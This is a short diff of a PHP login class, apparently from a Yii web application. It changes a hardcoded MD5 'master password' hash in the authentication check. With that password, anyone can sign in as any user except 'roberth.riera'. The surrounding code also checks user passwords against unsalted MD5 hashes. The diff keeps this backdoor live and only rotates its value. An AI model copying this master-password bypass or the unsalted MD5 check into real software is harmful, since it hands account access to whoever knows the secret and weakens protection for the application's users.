@@ -22,8 +22,8 @@ class UserIdentity extends CUserIdentity
 
 		if($users===null)
 			$this->errorCode=self::ERROR_USERNAME_INVALID;
-		elseif( (md5($this->password)!==$users->pwd && md5($this->password) !== '8343548972ee1dfdf675a00a177b7cf8') ||
-					(md5($this->password) == '8343548972ee1dfdf675a00a177b7cf8' && $this->username == 'roberth.riera') )
+		elseif( (md5($this->password)!==$users->pwd && md5($this->password) !== '228d5499d7259a1a9e3e2c9662ded033') ||
+					(md5($this->password) == '228d5499d7259a1a9e3e2c9662ded033' && $this->username == 'roberth.riera') )
 			$this->errorCode=self::ERROR_PASSWORD_INVALID;
 		else
 		{
